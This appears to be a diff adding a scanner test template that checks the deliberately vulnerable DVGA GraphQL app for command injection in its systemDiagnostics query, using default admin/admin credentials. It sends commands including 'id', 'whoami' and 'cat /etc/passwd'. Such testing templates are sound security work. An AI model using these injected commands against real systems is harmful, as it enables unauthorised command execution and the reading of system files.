@@ -1,0 +1,65 @@
+id: api8-command-injection-dvga
+info:
+  name: "DVGA - Command Injection via systemDiagnostics"
+  category: "API8:2023 Security Misconfiguration"
+  severity: "CRITICAL"
+  author: "hadrian"
+  description: "Tests for OS command injection in DVGA's systemDiagnostics query. The cmd parameter is vulnerable to command injection when authentication is bypassed or weak. Attackers can execute arbitrary system commands."
+  tags: ["graphql", "dvga", "command-injection", "rce"]
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: false
+
+role_selector:
+  attacker_permission_level: "all"
+  victim_permission_level: "all"
+
+graphql:
+  - query: |
+      {
+        systemDiagnostics(username: "admin", password: "admin", cmd: "id")
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["uid=", "gid="]
+        part: body
+        condition: or
+
+  - query: |
+      {
+        systemDiagnostics(username: "admin", password: "admin", cmd: "whoami")
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["data", "systemDiagnostics"]
+        part: body
+
+  - query: |
+      {
+        systemDiagnostics(username: "admin", password: "admin", cmd: "cat /etc/passwd")
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["root:", "systemDiagnostics"]
+        part: body
+        condition: or
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data.systemDiagnostics"
+      exists: true
+    - type: body_field
+      body_field: "errors"
+      exists: false
+  vulnerability_pattern: "dvga_command_injection_systemdiagnostics"
